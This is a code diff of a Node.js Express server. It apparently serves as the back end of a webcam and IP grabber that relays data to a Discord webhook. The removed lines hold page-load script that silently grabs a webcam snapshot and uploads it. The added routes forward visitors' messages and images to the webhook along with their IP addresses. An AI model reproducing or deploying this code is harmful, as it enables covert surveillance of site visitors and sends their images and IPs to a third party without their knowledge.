@@ -1,75 +1,79 @@
 require('dotenv').config();
 const express = require('express');
-const path = require('path');
-const fetch = require('node-fetch');
 const multer = require('multer');
-const fs = require('fs');
-const { createServer } = require('http');
+const fetch = require('node-fetch');
+const FormData = require('form-data');
 
 const app = express();
-const server = createServer(app);
-const PORT = process.env.PORT || 3000;
-const webhookUrl = process.env.WEBHOOK_URL;
+const upload = multer({ storage: multer.memoryStorage() });
 
-app.use(express.static(path.join(__dirname, 'public')));
-const upload = multer({ dest: 'uploads/' });
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
+if (!WEBHOOK_URL) {
+    console.error('WEBHOOK_URL is not defined in environment variables');
+    process.exit(1);
+}
 
-app.post('/send-image', upload.single('file'), async (req, res) => {
-    if (!webhookUrl) {
-        return res.status(500).json({ error: 'Webhook URL is not configured' });
-    }
-    
-    const filePath = req.file.path;
-    const fileStream = fs.createReadStream(filePath);
-    const formData = new FormData();
-    formData.append('file', fileStream, 'image.png');
-    
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static("public"));
+
+app.get('/api', (req, res) => {
+    res.send('API Server is running');
+});
+
+app.post('/api/send-message', async (req, res) => {
     try {
-        const response = await fetch(webhookUrl, { method: 'POST', body: formData });
-        fs.unlinkSync(filePath);
-        res.json({ success: response.ok });
+        const { message } = req.body;
+        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+        
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `IP: ${ip}\nMessage: ${message}` })
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Discord API error: ${response.statusText}`);
+        }
+        
+        res.status(200).send('Message sent');
     } catch (error) {
-        console.error('Error sending image:', error);
-        res.status(500).json({ error: 'Failed to send image' });
+        console.error(error);
+        res.status(500).send('Error sending message');
     }
 });
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-server.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});
-
-// Frontend JavaScript to handle webcam and image capture
-document.addEventListener('DOMContentLoaded', () => {
-    const video = document.createElement('video');
-    const canvas = document.createElement('canvas');
-    
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            video.srcObject = stream;
-            video.play();
-            setTimeout(captureImage, 1000);
-        })
-        .catch(err => console.error('Camera access error:', err));
-    
-    function captureImage() {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(sendImage, 'image/png');
-    }
-    
-    function sendImage(blob) {
+app.post('/api/send-image', upload.single('file'), async (req, res) => {
+    try {
+        if (!req.file) {
+            return res.status(400).send('No file uploaded');
+        }
+        
+        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+        
         const formData = new FormData();
-        formData.append('file', blob, 'image.png');
-    
-        fetch('/send-image', { method: 'POST', body: formData })
-            .then(response => console.log(response.ok ? 'Image sent' : 'Image send failed'))
-            .catch(error => console.error('Error:', error));
+        formData.append('file', req.file.buffer, { filename: 'image.png', contentType: req.file.mimetype });
+        formData.append('payload_json', JSON.stringify({ content: `IP: ${ip}` }));
+        
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            body: formData,
+            headers: formData.getHeaders()
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Discord API error: ${response.statusText}`);
+        }
+        
+        res.status(200).send('Image sent');
+    } catch (error) {
+        console.error(error);
+        res.status(500).send('Error sending image');
     }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
 });
 
